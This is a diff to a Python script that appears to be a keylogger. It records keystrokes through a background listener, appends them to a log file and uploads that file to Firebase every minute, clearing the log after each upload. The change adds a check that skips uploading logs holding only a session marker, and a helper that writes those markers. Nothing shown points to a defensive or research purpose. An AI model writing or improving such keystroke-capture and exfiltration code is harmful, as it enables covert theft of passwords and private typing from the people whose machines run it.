@@ -13,7 +13,6 @@ hostname = socket.gethostname()
 # Function to check internet availability
 def is_internet_available():
     try:
-        # Attempt to connect to a public DNS server
         socket.create_connection(("8.8.8.8", 53), timeout=5)
         return True
     except (socket.timeout, socket.error):
@@ -21,6 +20,15 @@ def is_internet_available():
 
 # Function to upload the log file to Firebase
 def upload_log():
+    with open(log_file, 'r') as file:
+        content = file.read().strip()
+    
+    # Check if the log file has only the new log marker
+    new_log_marker = f"** New logging started at"
+    if content.startswith(new_log_marker) and content.count(new_log_marker) == 1 and len(content.split("\n")) == 1:
+        print("Log file contains only the new log start marker. Skipping upload.")
+        return False
+
     if not is_internet_available():
         print("Internet not available, skipping upload.")
         return False
@@ -37,9 +45,8 @@ def upload_log():
             # Clear the log file after successful upload
             with open(log_file, 'w') as file:
                 file.truncate(0)
-            # Add a mark for the new logging session
-            with open(log_file, 'a') as file:
-                file.write(f"\n--- New logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
+            # Add a new marker for the next logging session
+            add_new_log_marker()
             return True
         else:
             print(f"Failed to upload (Status code {response.status_code}): {log_file}")
@@ -48,13 +55,18 @@ def upload_log():
         print(f"Failed to upload {log_file}: {e}")
         return False
 
+# Function to add a new logging session marker
+def add_new_log_marker():
+    with open(log_file, 'a') as file:
+        file.write(f"\n** New logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} **\n")
+
 # Function to periodically attempt uploading the log file every 1 minute
 def periodic_upload():
     while True:
         if upload_log():
             print("Log file uploaded successfully and cleared.")
         else:
-            print("Upload failed. Retrying in 1 minute.")
+            print("Upload failed or not needed. Retrying in 1 minute.")
         time.sleep(60)  # Wait for 1 minute before the next attempt
 
 # Debounce settings for keystrokes
@@ -90,13 +102,12 @@ def ensure_log_exists():
         with open(log_file, 'w') as file:
             pass  # Create an empty log file
 
-# Main process: check if the log has been uploaded and create a new log if necessary
+# Main process
 if __name__ == "__main__":
     ensure_log_exists()  # Ensure that the log file exists
 
-    # Add a mark indicating the start of a new logging session
-    with open(log_file, 'a') as file:
-        file.write(f"\n--- New logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
+    # Add a marker for the new logging session
+    add_new_log_marker()
 
     # Start listener in a separate thread
     listener_thread = threading.Thread(target=start_listener, daemon=True)
